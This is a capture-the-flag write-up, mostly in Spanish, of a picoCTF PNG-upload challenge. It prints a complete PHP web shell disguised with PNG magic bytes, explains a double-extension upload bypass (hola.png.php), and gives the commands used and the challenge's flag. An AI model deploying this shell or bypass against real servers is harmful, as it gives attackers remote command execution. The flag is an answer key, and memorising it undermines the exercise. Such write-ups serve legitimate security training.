## Descripción
I found a web app that can help process images: PNG images only!
## Solución
Primero inspeccionamos los archivos de la página. 
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

En el robots.txt viene este contenido:
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

En instructions.txt
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

En `/uploads/`
```
# Forbidden

You don't have permission to access this resource.

---

Apache/2.4.56 (Debian) Server at atlas.picoctf.net Port 49623
```

Para encontrar la bandera necesitamos de un web shell
```php
PNG

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>

```

Una vez que lo mandamos podemos ir a la ruta `http://atlas.picoctf.net:62186/uploads/hola.png.php` y ahí nos dan un buscador de archivos. Desde ahí podemos ejecutar un comando `find/ -name "*.txt"`

Nos despliegan muchos archivos, pero si aplicamos un cat en unos que se llama `GNTDOMBWGIZDE.txt` encontramos la bandera
```shell
cat /var/www/html/GNTDOMBWGIZDE.txt

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} */
```
## Notas adicionales
Si cargamos el php.png desde Windows este nos dice que es un archivo malicioso y borrará el archivo
## Referencias
https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985